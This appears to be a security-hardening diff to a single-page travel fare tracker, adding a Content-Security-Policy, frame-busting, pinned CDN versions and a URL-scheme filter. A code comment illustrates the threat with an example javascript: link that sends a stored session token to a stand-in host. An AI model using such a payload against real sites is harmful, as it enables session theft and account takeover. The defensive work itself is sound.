@@ -3,6 +3,27 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- The app builds its UI with innerHTML in ~34 places. Every one of them is
+     escaped, but a single miss would otherwise mean full account takeover, so
+     this is the blast radius limiter: connect-src is the important line — a
+     stolen session token can't be posted anywhere we don't already talk to.
+     script-src still needs 'unsafe-inline' because the whole app is one inline
+     module and there's no build step to hash it; that's the known soft spot.
+     data:/blob: in connect-src are for the OCR library reading its own wasm —
+     both are local reads with no network egress, so they cost nothing here.
+     frame-ancestors is ignored in a meta CSP, so framing is handled in JS. -->
+<meta http-equiv="Content-Security-Policy" content="
+  default-src 'self';
+  script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval' https://cdn.jsdelivr.net https://esm.sh;
+  worker-src 'self' blob:;
+  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+  font-src 'self' https://fonts.gstatic.com;
+  img-src 'self' data: blob: https://mmqcbjgftpwzaughimkr.supabase.co;
+  connect-src 'self' data: blob: https://mmqcbjgftpwzaughimkr.supabase.co https://cdn.jsdelivr.net https://esm.sh https://tessdata.projectnaptha.com;
+  object-src 'none';
+  base-uri 'none';
+  form-action 'none';
+">
 <title>Yes, Yes, with E-Kai You Travel</title>
 <link rel="icon" type="image/png" href="favicon.png">
 <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -753,12 +774,28 @@
   </div>
 
 <script type="module">
+// Clickjacking: a meta CSP can't express frame-ancestors, and GitHub Pages
+// serves no headers we control, so this is the only lever available. If we're
+// framed, break out. An attacker can't stop the navigation from a cross-origin
+// frame, and same-origin framing is nothing we do.
+if (window.top !== window.self){
+  try { window.top.location = window.self.location; }
+  catch { document.documentElement.innerHTML =
+    "<p style='font:16px system-ui;padding:24px'>This app can't be displayed inside another site.</p>"; }
+}
+
 // jsDelivr primary, esm.sh fallback — some networks/CDN edges fail one or the other.
+//
+// Pinned to an exact version rather than the "@2" range it used to track.
+// This library holds the session and every request to the database, so a
+// floating range means any future release — or anyone who compromises one —
+// executes here with full access to the signed-in account, with no change on
+// our side. Bumping is now a deliberate edit.
 let createClient;
 try {
-  ({ createClient } = await import('https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm'));
+  ({ createClient } = await import('https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.112.4/+esm'));
 } catch {
-  ({ createClient } = await import('https://esm.sh/@supabase/supabase-js@2'));
+  ({ createClient } = await import('https://esm.sh/@supabase/supabase-js@2.112.4'));
 }
 
 // These are intentionally public (standard Supabase client pattern) —
@@ -875,6 +912,27 @@ const fmtCash = (n, cur="USD") =>
 const fmtPoints = n => `${Number(n).toLocaleString()} pts`;
 const esc = s => (s ?? "").toString().replace(/[&<>"']/g, c =>
   ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+
+// esc() stops a value breaking out of an attribute; it does nothing about the
+// scheme. A booking URL saved as "javascript:fetch('https://evil/'+localStorage
+// .getItem('sb-...-auth-token'))" survives escaping intact and runs the moment
+// someone clicks "Check price". Trips and wishlist boards are shared, so that
+// is a path from one account into another's session, not just self-harm.
+//
+// Everything user-supplied that the browser will navigate to goes through here
+// first: only http(s) comes back, anything else becomes null and the caller
+// drops the link.
+function safeExternalUrl(raw){
+  const str = (raw ?? "").toString().trim();
+  if (!str) return null;
+  // Pasting "kayak.com/flights/..." without a scheme is normal, and there is
+  // no ambiguity about what was meant.
+  const hasScheme = /^[a-zA-Z][a-zA-Z0-9+.\-]*:/.test(str);
+  let u;
+  try { u = new URL(hasScheme ? str : `https://${str}`); }
+  catch { return null; }
+  return (u.protocol === "http:" || u.protocol === "https:") ? u.href : null;
+}
 
 // Category icons (flight/hotel/car) — illustrated to match the site logo,
 // used wherever the app used to show a plain emoji. Kept as <img> rather
@@ -1249,7 +1307,9 @@ function loadTesseract(){
   if (!tesseractLoadPromise){
     tesseractLoadPromise = new Promise((resolve, reject) => {
       const s = document.createElement("script");
-      s.src = "https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js";
+      // Pinned for the same reason as supabase-js above — this runs in the
+      // page with full access to the session.
+      s.src = "https://cdn.jsdelivr.net/npm/tesseract.js@5.1.1/dist/tesseract.min.js";
       s.onload = () => resolve(window.Tesseract);
       s.onerror = () => reject(new Error("Couldn't load the OCR library (offline?)."));
       document.head.appendChild(s);
@@ -2085,8 +2145,10 @@ function attachmentHolders(itemId){
 // to log against. Fragments are never sent to the server, so this is inert
 // to the airline site — skipped if the URL already has one, to be safe.
 function checkPriceUrl(f){
-  if (!f.url || f.url.includes("#")) return f.url;
-  return `${f.url}#farelog=${f.id}`;
+  const url = safeExternalUrl(f.url);
+  if (!url) return null;
+  if (url.includes("#")) return url;
+  return `${url}#farelog=${f.id}`;
 }
 
 // Inline SVG sparkline of logged prices over time, x-scaled to the actual
@@ -2313,7 +2375,7 @@ function renderCard(trip, f){
       </div>
       <div class="res-actions">
         ${attachmentHeader("flight", f.id, f.attachments)}
-        ${f.url ? `<a class="btn btn-sm" href="${esc(checkPriceUrl(f))}" target="_blank" rel="noopener">Check price →</a>` : ""}
+        ${checkPriceUrl(f) ? `<a class="btn btn-sm" href="${esc(checkPriceUrl(f))}" target="_blank" rel="noopener noreferrer">Check price →</a>` : ""}
         <details class="menu card-menu">
           <summary class="btn btn-ghost btn-sm" title="More actions">⋯</summary>
           <div class="menu-panel">
@@ -2966,7 +3028,7 @@ function renderRentalCard(trip, r){
       </div>
       <div class="res-actions">
         ${attachmentHeader("rental", r.id, r.attachments)}
-        ${r.url ? `<a class="btn btn-sm" href="${esc(r.url)}" target="_blank" rel="noopener">Open listing →</a>` : ""}
+        ${safeExternalUrl(r.url) ? `<a class="btn btn-sm" href="${esc(safeExternalUrl(r.url))}" target="_blank" rel="noopener noreferrer">Open listing →</a>` : ""}
         <details class="menu card-menu">
           <summary class="btn btn-ghost btn-sm" title="More actions">⋯</summary>
           <div class="menu-panel">
@@ -4564,8 +4626,14 @@ function wireEvents(activeTrip){
       // Each window.open() needs a distinct target name — reusing "_blank"
       // for every call makes browsers navigate the same tab instead of
       // opening one per link, so only the last URL ever ends up visible.
-      (activeTrip.flights || []).forEach(f => inScope(f.status) && f.url && window.open(f.url, `farecheck_${f.id}`));
-      (activeTrip.rentals || []).forEach(r => inScope(r.status) && r.url && window.open(r.url, `farecheck_${r.id}`));
+      // noopener as well as sanitising: without it the opened page gets a
+      // window.opener handle and can navigate this tab to a look-alike login.
+      const openSafely = (raw, name) => {
+        const url = safeExternalUrl(raw);
+        if (url) window.open(url, name, "noopener");
+      };
+      (activeTrip.flights || []).forEach(f => inScope(f.status) && openSafely(f.url, `farecheck_${f.id}`));
+      (activeTrip.rentals || []).forEach(r => inScope(r.status) && openSafely(r.url, `farecheck_${r.id}`));
     });
   });
 
@@ -5355,6 +5423,10 @@ async function processBookmarkletHash(){
   if (isNaN(price)) return;
   const found = findFlight(flightId);
   if (!found){ alert("Couldn't find that flight — it may have been moved or deleted."); return; }
+  // A fragment is just a link, and anyone can send one. Writing to the price
+  // history because a URL said so is a state change with no consent behind it,
+  // so confirm what's about to be recorded and against which flight.
+  if (!confirm(`Log ${fmtCash(price)} as a price check for "${found.flight.label}"?`)) return;
   await addPriceLog(flightId, new Date().toISOString().slice(0,10), price);
   activeTripId = found.trip.id;
   await refresh();
